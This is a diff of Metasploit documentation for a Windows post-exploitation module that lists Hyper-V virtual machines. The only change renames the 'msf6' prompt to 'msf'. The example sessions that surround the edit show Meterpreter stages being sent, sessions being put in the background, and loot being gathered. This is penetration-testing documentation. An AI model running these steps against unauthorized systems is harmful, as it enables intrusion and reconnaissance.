@@ -32,7 +32,7 @@ This module just uses the standard options available to any post module.
 ### Meterpreter session as a normal user on Windows Server 2019 Standard Edition - fails as user lacks required permissions
 
 ```
-msf6 exploit(multi/handler) > exploit
+msf exploit(multi/handler) > exploit
 
 [*] Started bind TCP handler against 172.20.150.24:4444
 [*] Sending stage (200262 bytes) to 172.20.150.24
@@ -53,8 +53,8 @@ SeMachineAccountPrivilege
 
 meterpreter > background
 [*] Backgrounding session 1...
-msf6 exploit(multi/handler) > use post/windows/gather/enum_hyperv_vms 
-msf6 post(windows/gather/enum_hyperv_vms) > show options
+msf exploit(multi/handler) > use post/windows/gather/enum_hyperv_vms 
+msf post(windows/gather/enum_hyperv_vms) > show options
 
 Module options (post/windows/gather/enum_hyperv_vms):
 
@@ -62,19 +62,19 @@ Module options (post/windows/gather/enum_hyperv_vms):
    ----     ---------------  --------  -----------
    SESSION                   yes       The session to run this module on.
 
-msf6 post(windows/gather/enum_hyperv_vms) > set session 1
+msf post(windows/gather/enum_hyperv_vms) > set session 1
 session => 1
-msf6 post(windows/gather/enum_hyperv_vms) > run
+msf post(windows/gather/enum_hyperv_vms) > run
 
 [+] Compressed size: 800
 [-] You need to be running as an elevated admin or a user of the Hyper-V Administrators group to run this module
 [*] Post module execution completed
-msf6 post(windows/gather/enum_hyperv_vms) > 
+msf post(windows/gather/enum_hyperv_vms) > 
 ```
 
 ### Meterpreter session as an elevated admin user
 ```
-msf6 exploit(multi/handler) > exploit
+msf exploit(multi/handler) > exploit
 
 [*] Started bind TCP handler against 172.20.150.24:4444
 [*] Sending stage (200262 bytes) to 172.20.150.24
@@ -117,10 +117,10 @@ SeUndockPrivilege
 
 meterpreter > background
 [*] Backgrounding session 2...
-msf6 exploit(multi/handler) > use post/windows/gather/enum_hyperv_vms 
-msf6 post(windows/gather/enum_hyperv_vms) > set SESSION 2 
+msf exploit(multi/handler) > use post/windows/gather/enum_hyperv_vms 
+msf post(windows/gather/enum_hyperv_vms) > set SESSION 2 
 SESSION => 2
-msf6 post(windows/gather/enum_hyperv_vms) > run
+msf post(windows/gather/enum_hyperv_vms) > run
 
 [+] Compressed size: 800
 [*] Name           State   CPUUsage(%) MemoryAssigned(M) Uptime           Status             Version
@@ -130,5 +130,5 @@ Windows XP SP3 Running 79          2048              02:54:58.3210000 Operating 
 
 [+] Stored loot at /home/gwillcox/.msf4/loot/20200910184541_default_172.20.150.24_host.hyperv_vms_309544.txt
 [*] Post module execution completed
-msf6 post(windows/gather/enum_hyperv_vms) > 
+msf post(windows/gather/enum_hyperv_vms) > 
 ```
